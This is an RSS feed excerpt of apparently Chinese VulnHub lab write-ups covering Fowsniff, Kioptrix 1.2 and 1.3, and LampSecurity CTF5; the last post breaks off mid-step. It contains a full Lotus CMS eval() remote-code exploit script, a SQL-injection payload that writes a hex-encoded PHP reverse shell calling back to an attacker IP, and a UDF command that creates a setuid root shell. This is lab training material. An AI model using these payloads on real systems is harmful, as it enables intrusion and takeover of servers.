      <title>0x027 FOWSNIFF1 </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x027-fowsniff1-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x027-fowsniff1-/</guid>
      <description>&lt;p&gt;要改网络&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE14a2ee882388d33ff985c0ad8862ce93%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE720c1716364a146d7d7bff5f592fa15f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;web渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7f7dd3103e49016f81c1e51f23175c3d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;官网有相关提示，说密码泄露了，twitter账号上可能有线索：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0144f3218f1bb2dc1a2ef171cbca8391%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;去twitter上搜相关账号，结果发现相关链接404了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcd12db52b26cb29f60841da70b99f26c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6b9a855ff01705aeca4cb5c61946ad80%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能网上找现成的WP上的图片了，里面说这是POP邮箱服务的账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa1c3637bed4dc1ed3451996caa2ce43f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;捡回我的AWK命令处理一下数据：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat hash | awk -F: &amp;#39;{print$1}&amp;#39; &amp;gt; pop3username
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE42995391e967fc9899dde93b8c3edc2a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;本地跑hash速度还是慢了，我还是建议批量跑：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://crackstation.net/&#34;&gt;https://crackstation.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd28be300a3b0ce3a10d35e604df52a93%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后爆破，这里有个坑，第一次用的用户名@域名的方式爆破没爆出来，然后把用户名单独提取出来才爆出来&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4cb2e22638e28598253b21cebf345b2b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后链接方式就比较多了，wp使用的NC，redis其实也可以使用nc，邮件其实还是图形化好一点，kali我用了thunderbird，windows直接使用foxmail就行了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE82d101b53c58dec83905d7599d382206%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用thunderbird需要点开高级设置：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8931ab0842845b4b60f2d0d5382e4c94%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;得到ssh密码：S1ck3nBluff+secureshell&lt;/p&gt;
&lt;p&gt;根据收件人信息再次爆破：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4f0545d0e0fd5f226875388e111d42cc%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;常规手动查的差不多，没有发现明显的提权点，然后上脚本查找，发现可疑的执行脚本：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa12c89750bf80fcd36f4d97499bc847c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd2675bc5e5748d740cf098aefef32f1c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现和登录信息一样：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb3674d9c08407f58df270222ac4747dd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;写反弹shell，重新登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE02bf985f28fa5b4d635bb9e62121418e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x028 Kioptrix Level 1.2</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x028-kioptrix-level-1.2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x028-kioptrix-level-1.2/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd82406e1ceb19328fc7b540808c2bbe5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;LotusCMS漏洞，利用脚本：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/usr/bin/python
# Lotus CMS 3.0 eval() Remote Command Execition Exploit
# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/
# Auther Vaibhav Joshi(https://twitter.com/vj0shii)
import sys,requests,os

def execute(URL):
    os.system(&amp;#34;clear&amp;#34;)
    print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
    print(&amp;#34;\t|        Lotus CMS 3.0 eval() Remote Command Execition       |&amp;#34;)
    print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
    print(&amp;#34;\t| Reference : http://secunia.com/secunia_research/2011-21/   |&amp;#34;)
    print(&amp;#34;\t| By        : Vaibhav Joshi                                  |&amp;#34;)
    print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
    while True:
        loginurl = URL+&amp;#34;index.php&amp;#34;
        command = raw_input(&amp;#34;# &amp;#34;)
        if command == &amp;#34;exit&amp;#34;:
            print(&amp;#34;Goodbye!&amp;#34;)
            exit(0)
        payload = &amp;#34;index&amp;#39;);${system(&amp;#39;&amp;#34;+command+&amp;#34;&amp;#39;)};#&amp;#34;
        r = requests.post(loginurl,headers={&amp;#39;Content-Type&amp;#39;: &amp;#39;application/x-www-form-urlencoded&amp;#39;},data={&amp;#39;page&amp;#39;: payload})
        text = r.text
        t = text.split(&amp;#34;&amp;lt;/html&amp;gt;&amp;#34;)
        print(t[1])


def Verify(URL):
    r = requests.get(URL,allow_redirects=False)
    if r.status_code != 200:
        print(&amp;#34;Url is not valid&amp;#34;)
        exit(0)

try:
    print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
    print(&amp;#34;\t|        Lotus CMS 3.0 eval() Remote Command Execition       |&amp;#34;)
    print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
    print(&amp;#34;\t| Reference : http://secunia.com/secunia_research/2011-21/   |&amp;#34;)
    print(&amp;#34;\t| By        : Vaibhav Joshi                                  |&amp;#34;)
    print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
    if len(sys.argv) &amp;lt; 3:
        print(&amp;#34;\t| Usage     : %s &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;                            |&amp;#34; % sys.argv[0])
        print(&amp;#34;\t--------------------------------------------------------------&amp;#34;)
        sys.exit()
    host = sys.argv[1]
    port = sys.argv[2]
    loc = raw_input(&amp;#34;Enter Home page URI of CMS (Default /): &amp;#34;)
    if loc == &amp;#34;&amp;#34;:
        loc = &amp;#34;/&amp;#34;
    URL = &amp;#34;http://&amp;#34; + host + &amp;#34;:&amp;#34; + port + loc
    Verify(URL)
    execute(URL)

except Exception as error:
    print &amp;#39;Caught this error: &amp;#39; + repr(error)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE965e967ef8d2aab44edd44912a6ce454%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x029 Kioptrix Level 1.3</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x029-kioptrix-level-1.3/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x029-kioptrix-level-1.3/</guid>
      <description>&lt;p&gt;这个机器需要新建虚拟机，然后从磁盘加载，然后保存现有格式即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf07f618ea1b834fa7abeb124fc8a04ae%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEadcc3dbc1c83aeb6839e00969e6bd396%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE878aace2dd96a7d0d5956226edf1d25f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;疑似线索：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5222b2d6fd7e353a4d0c1b7eb00747a5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sql注入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE84f361280f37a9b1dd5157674e583fc6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;居然能直接&amp;ndash;os-shell，靶场里面很少见啊：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE776cf2fb28db25398cf0781432ade1af%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;首先我反弹shell，这里我详细看了一下，出现了一个问题，这里的sqlmap直接getshell了，但是很明显的是，我目前对当前目录是没有写入权限的，同时刚刚上面sqlmap的告警也告诉了我们这件事：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9f09b8c6d4f4014f9397c35f3c0b0634%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是sqlmap的小马拉大马中的小马是肯定成功上传了的，那么答案就比较明显了，mysql是具备写入权限的，但是apache不具备:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5757be8cde328d41545710f88bb6c0a7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;解决方案就比较简单了，通过sql注入直接写反弹shell的脚本即可，具体操作方法通过sqlmap代理到bp，抓包，修复第一个上传小马的包即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd9d1c58ed8ba99db61b43bd001507db5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;payload如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;myusername=john&amp;amp;mypassword=-7572%27%20OR%201681=1681%20LIMIT%200,1%20INTO%20OUTFILE%20%27%2fvar%2fwww%2fcxk1.php%27%20LINES%20TERMINATED%20BY%20%0A0x20203c3f7068700a20202f2f207068702d726576657273652d7368656c6c202d20412052657665727365205368656c6c20696d706c656d656e746174696f6e20696e205048500a20202f2f20436f707972696768742028432920323030372070656e746573746d6f6e6b65794070656e746573746d6f6e6b65792e6e65740a0a20207365745f74696d655f6c696d6974202830293b0a20202456455253494f4e203d2022312e30223b0a2020246970203d20273139322e3136382e352e3131273b20202f2f20596f752068617665206368616e67656420746869730a202024706f7274203d20383838383b20202f2f20416e6420746869730a2020246368756e6b5f73697a65203d20313430303b0a20202477726974655f61203d206e756c6c3b0a2020246572726f725f61203d206e756c6c3b0a2020247368656c6c203d2027756e616d65202d613b20773b2069643b202f62696e2f7368202d69273b0a2020246461656d6f6e203d20303b0a2020246465627567203d20303b0a0a20202f2f0a20202f2f204461656d6f6e697365206f757273656c6620696620706f737369626c6520746f2061766f6964207a6f6d62696573206c617465720a20202f2f0a0a20202f2f2070636e746c5f666f726b20697320686172646c79206576657220617661696c61626c652c206275742077696c6c20616c6c6f7720757320746f206461656d6f6e6973650a20202f2f206f7572207068702070726f6365737320616e642061766f6964207a6f6d626965732e2020576f7274682061207472792e2e2e0a20206966202866756e6374696f6e5f657869737473282770636e746c5f666f726b272929207b0a202020202f2f20466f726b20616e6420686176652074686520706172656e742070726f6365737320657869740a2020202024706964203d2070636e746c5f666f726b28293b0a202020200a202020206966202824706964203d3d202d3129207b0a2020202020207072696e74697428224552524f523a2043616e277420666f726b22293b0a202020202020657869742831293b0a202020207d0a202020200a20202020696620282470696429207b0a202020202020657869742830293b20202f2f20506172656e742065786974730a202020207d0a0a202020202f2f204d616b65207468652063757272656e742070726f6365737320612073657373696f6e206c65616465720a202020202f2f2057696c6c206f6e6c79207375636365656420696620776520666f726b65640a2020202069662028706f7369785f7365747369642829203d3d202d3129207b0a2020202020207072696e74697428224572726f723a2043616e277420736574736964282922293b0a202020202020657869742831293b0a202020207d0a0a20202020246461656d6f6e203d20313b0a20207d20656c7365207b0a202020207072696e74697428225741524e494e473a204661696c656420746f206461656d6f6e6973652e20205468697320697320717569746520636f6d6d6f6e20616e64206e6f7420666174616c2e22293b0a20207d0a0a20202f2f204368616e676520746f20612073616665206469726563746f72790a2020636864697228222f22293b0a0a20202f2f2052656d6f766520616e7920756d61736b20776520696e686572697465640a2020756d61736b2830293b0a0a20202f2f0a20202f2f20446f207468652072657665727365207368656c6c2e2e2e0a20202f2f0a0a20202f2f204f70656e207265766572736520636f6e6e656374696f6e0a202024736f636b203d2066736f636b6f70656e282469702c2024706f72742c20246572726e6f2c20246572727374722c203330293b0a2020696620282124736f636b29207b0a202020207072696e7469742822246572727374722028246572726e6f2922293b0a20202020657869742831293b0a20207d0a0a20202f2f20537061776e207368656c6c2070726f636573730a20202464657363726970746f7273706563203d206172726179280a2020202030203d3e206172726179282270697065222c20227222292c20202f2f20737464696e20697320612070697065207468617420746865206368696c642077696c6c20726561642066726f6d0a2020202031203d3e206172726179282270697065222c20227722292c20202f2f207374646f757420697320612070697065207468617420746865206368696c642077696c6c20777269746520746f0a2020202032203d3e206172726179282270697065222c20227722292020202f2f2073746465727220697320612070697065207468617420746865206368696c642077696c6c20777269746520746f0a2020293b0a0a20202470726f63657373203d2070726f635f6f70656e28247368656c6c2c202464657363726970746f72737065632c20247069706573293b0a0a2020696620282169735f7265736f75726365282470726f636573732929207b0a202020207072696e74697428224552524f523a2043616e277420737061776e207368656c6c22293b0a20202020657869742831293b0a20207d0a0a20202f2f205365742065766572797468696e6720746f206e6f6e2d626c6f636b696e670a20202f2f20526561736f6e3a204f636373696f6e616c6c792072656164732077696c6c20626c6f636b2c206576656e2074686f7567682073747265616d5f73656c6563742074656c6c73207573207468657920776f6e27740a202073747265616d5f7365745f626c6f636b696e67282470697065735b305d2c2030293b0a202073747265616d5f7365745f626c6f636b696e67282470697065735b315d2c2030293b0a202073747265616d5f7365745f626c6f636b696e67282470697065735b325d2c2030293b0a202073747265616d5f7365745f626c6f636b696e672824736f636b2c2030293b0a0a20207072696e74697428225375636365737366756c6c79206f70656e65642072657665727365207368656c6c20746f202469703a24706f727422293b0a0a20207768696c6520283129207b0a202020202f2f20436865636b20666f7220656e64206f662054435020636f6e6e656374696f6e0a202020206966202866656f662824736f636b2929207b0a2020202020207072696e74697428224552524f523a205368656c6c20636f6e6e656374696f6e207465726d696e6174656422293b0a202020202020627265616b3b0a202020207d0a0a202020202f2f20436865636b20666f7220656e64206f66205354444f55540a202020206966202866656f66282470697065735b315d2929207b0a2020202020207072696e74697428224552524f523a205368656c6c2070726f63657373207465726d696e6174656422293b0a202020202020627265616b3b0a202020207d0a0a202020202f2f205761697420756e74696c206120636f6d6d616e6420697320656e6420646f776e2024736f636b2c206f7220736f6d650a202020202f2f20636f6d6d616e64206f757470757420697320617661696c61626c65206f6e205354444f5554206f72205354444552520a2020202024726561645f61203d2061727261792824736f636b2c202470697065735b315d2c202470697065735b325d293b0a20202020246e756d5f6368616e6765645f736f636b657473203d2073747265616d5f73656c6563742824726561645f612c202477726974655f612c20246572726f725f612c206e756c6c293b0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652054435020736f636b65742c2073656e640a202020202f2f206461746120746f2070726f63657373277320535444494e0a2020202069662028696e5f61727261792824736f636b2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e7469742822534f434b205245414422293b0a20202020202024696e707574203d2066726561642824736f636b2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e7469742822534f434b3a2024696e70757422293b0a202020202020667772697465282470697065735b305d2c2024696e707574293b0a202020207d0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652070726f636573732773205354444f55540a202020202f2f2073656e64206461746120646f776e2074637020636f6e6e656374696f6e0a2020202069662028696e5f6172726179282470697065735b315d2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e74697428225354444f5554205245414422293b0a20202020202024696e707574203d206672656164282470697065735b315d2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e74697428225354444f55543a2024696e70757422293b0a2020202020206677726974652824736f636b2c2024696e707574293b0a202020207d0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652070726f636573732773205354444552520a202020202f2f2073656e64206461746120646f776e2074637020636f6e6e656374696f6e0a2020202069662028696e5f6172726179282470697065735b325d2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e7469742822535444455252205245414422293b0a20202020202024696e707574203d206672656164282470697065735b325d2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e74697428225354444552523a2024696e70757422293b0a2020202020206677726974652824736f636b2c2024696e707574293b0a202020207d0a20207d0a0a202066636c6f73652824736f636b293b0a202066636c6f7365282470697065735b305d293b0a202066636c6f7365282470697065735b315d293b0a202066636c6f7365282470697065735b325d293b0a202070726f635f636c6f7365282470726f63657373293b0a0a20202f2f204c696b65207072696e742c2062757420646f6573206e6f7468696e67206966207765277665206461656d6f6e69736564206f757273656c660a20202f2f2028492063616e277420666967757265206f757420686f7720746f207265646972656374205354444f5554206c696b6520612070726f706572206461656d6f6e290a202066756e6374696f6e207072696e746974202824737472696e6729207b0a202020206966202821246461656d6f6e29207b0a2020202020207072696e74202224737472696e670a223b0a202020207d0a20207d0a0a20203f3e20%0A--%20-&amp;amp;Submit=Login
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里的payload是url全部+&lt;/p&gt;
&lt;p&gt;然后就成功上传反弹shell脚本：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE54a5081078ef0558a6206063821d8a90%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;数据库内容翻一下，切换到用户里面去&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE922177532bf3246c6f786e4dab1c35c3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;切换过去后，就发现了命令行不对劲，看了一下passwd，果然不对劲，然后执行几次后还要被提出去：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6962f5d2eceeadbe873dd902b266bf24%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后就是kshell切换到bash可以使用&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo os.system(&amp;#39;/bin/bash&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6cd23af6a93e70e9ed83f945158a3e86%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现疑似提权点，后面发现不行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf27a330ca5d6947ece2525c0a7fdd689%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后就是wget命令不让用，邪门儿：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE759604e012693e01e1859cc2a976f534%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后，猪脑过载了，没找到提权方式，看了WP，是UDF提权，完全没往这个方向思考（&lt;/p&gt;
&lt;p&gt;本身就存在udf提权文件，这里免去了文件上传的问题，但是理论上前面的上传方式应该可以使用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;select sys_exec(&amp;#39;cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE04abce5874af72cadbf320aa802b5e59%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面再次抓包分析sqlmap的数据包解答了我的疑惑，sqlmap不是单独的小马拉大马，而是先尝试进行小马拉大马，如果不行，就再次尝试使用mysql语句写入，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45f579ee4a1d5c70e5135d8a6062503d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;其实看文件属性也可以知道，但是主要是想要求证一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8f22bd492e68db679e35fa6e97871383%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;sql注入后利用的靶场&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x030 LampSecurity CTF5</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x030-lampsecurity-ctf5/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x030-lampsecurity-ctf5/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE08f99b02faa408bc8c2e03f9d9677446%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbc1513a46c402a3d395a06065c4edbd2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;smb\mysql渗透无果，看来突破口还是在80端口上：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEed67ef867d263248b51fb46cd677fdb7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很难受，大致逛了一圈后，基本思路是OK的，看到了NanoCMS的RCE，但是需要认证，然后是SquirrelMail的历史漏洞，那个版本的打完了，没有能用的，后面想办法获取凭证无果，无奈看WP，只能说，棋差一招：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5fcb3b6f55457caa801742765ba1fdbf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://packetstormsecurity.com/files/76642/Security-Evaluation-Of-NanoCMS.html&#34;&gt;https://packetstormsecurity.com/files/76642/Security-Evaluation-Of-NanoCMS.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中有信息提到，NanoCMS存在信息泄露：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE42fcd10e2bf1a7ebc414e678856a71a4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb44c5e672a8125f23ee311c60276797b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE17914a647dde3cc1acd11e0161106266%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;到最后也没用上脚本：&lt;/p&gt;
&lt;p&gt;添加一个页面：&lt;/p&gt;
